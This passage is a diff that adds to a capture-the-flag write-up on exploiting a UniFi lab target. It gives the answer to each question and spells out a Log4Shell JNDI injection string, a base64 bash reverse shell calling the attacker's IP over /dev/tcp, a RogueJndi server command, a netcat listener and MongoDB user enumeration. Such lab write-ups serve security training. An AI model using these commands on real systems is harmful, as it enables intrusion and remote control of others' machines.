@@ -62,9 +62,93 @@ Hint : Look for UniFi vulnerabilities in 2021
 
 **Answer: 389**
 
+
 ## What port is the MongoDB service running on?
 
 *Hint: Check the running processes on the system*
+
+![Screenshot 2024-03-15 at 1 28 38 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/7989e4c4-5917-4239-a5f6-8b732cf9da03)
+![Screenshot 2024-03-15 at 1 29 29 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/c3d4fcf2-6bc0-4e71-8caf-916e48e87c35)
+![Screenshot 2024-03-15 at 1 31 27 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/3e1b9c42-0444-4ee0-915e-a2eaff881b70)
+
+
+![Screenshot 2024-03-15 at 1 47 20 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/d710e27c-8a08-4bbb-aadd-8269bb840f03)
+![Screenshot 2024-03-15 at 1 49 57 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/75338ac5-9b49-4c30-a0a9-9b3119c541be)
+![Screenshot 2024-03-15 at 1 47 08 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/9b1e7b71-06df-42b2-99a8-7a3dfb8e5302)
+
+This will convert the reverse shell payload to base64. 
+```echo 'bash -c bash -i >&/dev/tcp/{Your IP Address}/{A port of your choice} 0>&1' | base64```
+
+
+```java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,BASE64 STRING HERE}|{base64,-d}|{bash,-i}" --hostname "{YOUR TUN0 IP ADDRESS}"```
+
+
+open new terminal netcat listener
+
+
+```nc -lvp 4444```
+
+Go back to burp and edit the remmber 
+${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat}
+
+
+
+
+We now have a shell in our netcat listener now let's upgrade it 
+
+
+
+![Screenshot 2024-03-15 at 2 40 37 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/623bfe9f-b4ef-40d7-ac5e-f64e3551d63e)
+
+![Screenshot 2024-03-15 at 10 37 08 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/394f9896-bd86-4898-8810-0a8ba2636bd5)
+
+
+now let's upgrade it into a bash shell
+
+```script /dev/null -c bash```
+
+![Screenshot 2024-03-15 at 10 06 21 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/d0b07957-14c2-4637-a951-6f65d1dc503c)
+
+
+
+## What port is the MongoDB service running on?
+1. Let's list down all the services in our target by running the command
+   ``` ps aux | grep mongo```
+![Screenshot 2024-03-15 at 10 47 02 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/5aff177d-c25c-4be3-bea7-d895682c81d1)
+
+**Answer: 27117**
+
+## What is the default database name for UniFi applications?
+*Hint: Connect to Mongo and list the databases*
+
+1. Let's connect to mongo runningin  port 27117
+   ```
+   mongo --port 27117
+   ```
+![Screenshot 2024-03-15 at 10 54 54 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/a9b10320-f5b1-491b-82f0-865267aa6178)
+
+2. Let's list all databases
+```show dbs```
+
+![Screenshot 2024-03-15 at 10 56 56 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/452d21ea-a394-4545-84f2-d2bfd3672a5b)
+
+**Answer: ace ** 
+
+## What is the function we use to enumerate users within the database in MongoDB?
+
+*Hint: Search for "find items in mongo" in Google*
+
+1. Upon our google search we find ```db.admin.find()**
+
+**Answer: db.admin.find()**
+
+## What is the function we use to update users within the database in MongoDB?
+
+*Hint: Search for "update items in mongo" in Google*
+
+**Answer:db.admin.update**
+
+   
 
 
 
